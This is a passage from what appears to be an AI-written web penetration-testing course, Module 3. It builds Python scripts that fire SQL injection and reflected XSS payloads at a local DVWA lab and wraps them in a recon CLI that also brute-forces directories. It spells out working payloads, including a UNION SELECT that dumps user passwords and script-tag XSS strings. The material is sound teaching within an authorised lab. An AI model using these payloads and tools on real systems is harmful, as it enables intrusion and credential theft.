        print(f"Payload: {payload!r}")
        print(f"  Response length: {response_length} chars")
        print(f"  Verdict: {verdict}\n")
```

### The Verification

```bash
python3 scripts/module3/sqli_tester.py
```

**Expected output (abbreviated — actual lengths vary by DVWA version):**
```
Authenticating to DVWA...

[OK] Logged into DVWA successfully.
[OK] Security level set to 'low'.

Testing SQLi payloads against http://192.168.56.101/dvwa/vulnerabilities/sqli/

[INFO] Baseline response length (id='1'): 4532 chars

Payload: "1' OR '1'='1"
  Response length: 9871 chars
  Verdict: likely_vulnerable (response size anomaly)

Payload: "1' UNION SELECT user, password FROM users -- -"
  Response length: 5204 chars
  Verdict: likely_vulnerable (response size anomaly)

Payload: "1' AND 1=CONVERT(int, (SELECT @@version)) -- "
  Response length: 4390 chars
  Verdict: likely_safe
```

Manually visit `http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit` in your browser (while logged in) to **visually confirm** the payload dumped every user in the table instead of just one — this is your ground-truth confirmation that the automated verdict above was correct, not just plausible-looking output.

---

## Step 7: Automated XSS Payload Tester

### The Target
`scripts/module3/xss_tester.py` — send a list of Cross-Site Scripting payloads to DVWA's reflected XSS page and detect whether they're reflected back unescaped.

### The Concept
If SQLi tricks the *database* clerk, **Cross-Site Scripting (XSS)** tricks the *browser* reading the page. Imagine a community bulletin board where anyone can pin up a note, and the board's manager reads every note aloud verbatim over the building's PA system without checking what's actually written on it. If you pin a note that says "ATTENTION: FIRE DRILL" but really is disguised as an instruction, and the manager reads it as an announcement rather than as *your* submitted content, everyone in the building now unknowingly acts on your words with the manager's authority. That's XSS: user-submitted text gets echoed back into a page as if it were trusted HTML/JavaScript, instead of being treated as inert text to display.

Our detection strategy here is simpler than SQLi's: we submit a payload containing a unique, unmistakable string, and check whether that **exact, unescaped string** appears in the raw response HTML. If the application had correctly sanitized our input, we'd instead see an *encoded* version (e.g., `&lt;script&gt;` instead of `<script>`) — the presence of the literal, un-encoded tag is the smoking gun.

### The Implementation

**`scripts/module3/xss_tester.py`**
```python
"""
xss_tester.py
Sends a curated list of XSS payloads to DVWA's reflected XSS page and
checks whether each is reflected back unescaped in the raw HTML.

FOR AUTHORIZED LAB USE ONLY — DVWA, security level 'low'.
"""

import requests

from dvwa_session import create_authenticated_dvwa_session, DVWA_BASE_URL

REQUEST_TIMEOUT_SECONDS = 5
XSS_ENDPOINT = f"{DVWA_BASE_URL}/vulnerabilities/xss_r/"

# Each payload is intentionally distinct and easy to grep for in raw HTML.
# Real assessments cover many more encodings/bypasses (see this module's
# Appendix), but these illustrate the detection technique clearly.
XSS_PAYLOADS = [
    "<script>alert('XSS_TEST_1')</script>",
    "<img src=x onerror=\"alert('XSS_TEST_2')\">",
    "<svg/onload=alert('XSS_TEST_3')>",
]


def submit_payload(session: requests.Session, payload: str) -> requests.Response:
    """Submits a single payload to DVWA's reflected XSS 'name' GET parameter."""
    params = {"name": payload}
    try:
        return session.get(XSS_ENDPOINT, params=params, timeout=REQUEST_TIMEOUT_SECONDS)
    except requests.exceptions.RequestException as err:
        print(f"[WARN] Request failed for payload {payload!r}: {err}")
        return None


def is_reflected_unescaped(response: requests.Response, payload: str) -> bool:
    """
    Checks whether the EXACT, unescaped payload string appears in the
    raw response body. If the app escaped it (e.g., '&lt;script&gt;'),
    this exact match correctly fails, which is the desired behavior.
    """
    if response is None:
        return False
    return payload in response.text


if __name__ == "__main__":
    print("Authenticating to DVWA...\n")
    session = create_authenticated_dvwa_session()

    print(f"\nTesting XSS payloads against {XSS_ENDPOINT}\n")

    for payload in XSS_PAYLOADS:
        response = submit_payload(session, payload)
        reflected = is_reflected_unescaped(response, payload)

        verdict = "VULNERABLE — reflected unescaped" if reflected else "not reflected / escaped"
        print(f"Payload: {payload}")
        print(f"  Verdict: {verdict}\n")
```

### The Verification

```bash
python3 scripts/module3/xss_tester.py
```

**Expected output:**
```
Authenticating to DVWA...

[OK] Logged into DVWA successfully.
[OK] Security level set to 'low'.

Testing XSS payloads against http://192.168.56.101/dvwa/vulnerabilities/xss_r/

Payload: <script>alert('XSS_TEST_1')</script>
  Verdict: VULNERABLE — reflected unescaped

Payload: <img src=x onerror="alert('XSS_TEST_2')">
  Verdict: VULNERABLE — reflected unescaped

Payload: <svg/onload=alert('XSS_TEST_3')>
  Verdict: VULNERABLE — reflected unescaped
```

Confirm this visually: open `http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS_TEST_1')</script>` directly in a real browser — you should see an actual JavaScript `alert()` popup box appear, which is the unmistakable, hands-on proof that the browser executed our injected script rather than displaying it as harmless text.

---

## Step 8: The Final Combined CLI Recon Tool

### The Target
`scripts/module3/webrecon.py` — a single command-line tool unifying directory brute-forcing, form scraping, and payload testing behind clean subcommands.

### The Concept
Just like Module 1's `pyscan.py` tied together every standalone script into one polished tool, we do the same here using `argparse`'s **subparsers** feature — think of it like a Swiss Army knife where `webrecon.py dirbrute ...` and `webrecon.py sqli ...` are simply different blades folded into the same handle, sharing the same handle (imports) but each with its own specific arguments.

### The Implementation

**`scripts/module3/webrecon.py`**
```python
"""
webrecon.py
Unified CLI for Module 3's web assessment tools.

USAGE (authorized lab targets only — see ROE.md):
    python3 webrecon.py dirbrute --url http://192.168.56.1:3000 --wordlist wordlists/common_paths.txt
    python3 webrecon.py sqli
    python3 webrecon.py xss
"""

import argparse
import sys

from dir_bruteforce import run_bruteforce, load_wordlist
from dvwa_session import create_authenticated_dvwa_session
from sqli_tester import SQLI_PAYLOADS, submit_payload as submit_sqli, analyze_response
from xss_tester import XSS_PAYLOADS, submit_payload as submit_xss, is_reflected_unescaped

REQUEST_TIMEOUT_SECONDS = 5


def handle_dirbrute(args: argparse.Namespace) -> None:
    wordlist = load_wordlist(args.wordlist)
    results = run_bruteforce(args.url, wordlist, REQUEST_TIMEOUT_SECONDS, args.threads)
    found = [r for r in results if r["verdict"] == "found"]

    print(f"\n{'=' * 60}\nGenuine Discoveries\n{'=' * 60}")
    for r in found:
        print(f"  [{r['status']}] {r['url']}  ({r['length']} bytes)")
    if not found:
        print("  None found.")


def handle_sqli(args: argparse.Namespace) -> None:
    session = create_authenticated_dvwa_session()
    baseline_response = submit_sqli(session, SQLI_PAYLOADS[0])
    baseline_length = len(baseline_response.text) if baseline_response else 0

    for payload in SQLI_PAYLOADS[1:]:
        response = submit_sqli(session, payload)
        verdict = analyze_response(baseline_length, response)
        print(f"Payload: {payload!r}\n  Verdict: {verdict}\n")


def handle_xss(args: argparse.Namespace) -> None:
    session = create_authenticated_dvwa_session()
    for payload in XSS_PAYLOADS:
        response = submit_xss(session, payload)
        reflected = is_reflected_unescaped(response, payload)
        verdict = "VULNERABLE — reflected unescaped" if reflected else "not reflected / escaped"
        print(f"Payload: {payload}\n  Verdict: {verdict}\n")


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Unified web assessment CLI. FOR AUTHORIZED LAB USE ONLY."
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    dirbrute_parser = subparsers.add_parser("dirbrute", help="Directory/file brute-forcer")
    dirbrute_parser.add_argument("--url", required=True, help="Base URL (e.g., http://192.168.56.1:3000)")
    dirbrute_parser.add_argument("--wordlist", required=True, help="Path to wordlist file")
    dirbrute_parser.add_argument("--threads", type=int, default=20, help="Concurrent threads (default: 20)")
    dirbrute_parser.set_defaults(func=handle_dirbrute)

    sqli_parser = subparsers.add_parser("sqli", help="Automated SQLi payload tester (DVWA)")
    sqli_parser.set_defaults(func=handle_sqli)

    xss_parser = subparsers.add_parser("xss", help="Automated XSS payload tester (DVWA)")
    xss_parser.set_defaults(func=handle_xss)

    return parser


if __name__ == "__main__":
    args = build_arg_parser().parse_args()
    try:
        args.func(args)
    except KeyboardInterrupt:
        print("\n[INFO] Interrupted by user.")
        sys.exit(1)
```

### The Verification

```bash
python3 scripts/module3/webrecon.py --help
python3 scripts/module3/webrecon.py dirbrute --url http://192.168.56.1:3000 --wordlist wordlists/common_paths.txt
python3 scripts/module3/webrecon.py sqli
python3 scripts/module3/webrecon.py xss
```

Each subcommand should reproduce exactly the output you already verified individually in Steps 3, 6, and 7 — confirming the unification didn't change any underlying behavior, only the interface wrapping it.

---

Module 3 complete. Whenever you're ready, request **Module 4** or a specific appendix (A, B, or C) and I'll expand it standalone.
